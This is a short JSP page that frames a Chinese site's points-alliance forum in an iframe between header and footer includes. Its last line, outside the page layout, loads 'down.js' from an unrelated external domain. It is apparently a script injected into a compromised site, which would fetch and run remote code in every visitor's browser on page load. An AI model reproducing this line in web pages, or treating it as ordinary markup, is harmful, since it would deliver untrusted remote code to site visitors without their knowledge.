<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<%@ taglib prefix="ct" uri="/WEB-INF/category.tld" %>

<link rel="stylesheet" href="css/style.css" type="text/css" />
<c:set var="title" value="积分联盟-论坛"/>
<%@ include file="IncludeTop.jsp" %>
	
<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
	<tr>
		<td>
		    <iframe name="forumFrame" id="forumFrame"  src='<c:url value="/forums/list.page"/>' width="780"  noresize  frameborder="no" target="_top">
			</iframe>
    	</td>
	</tr>	
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>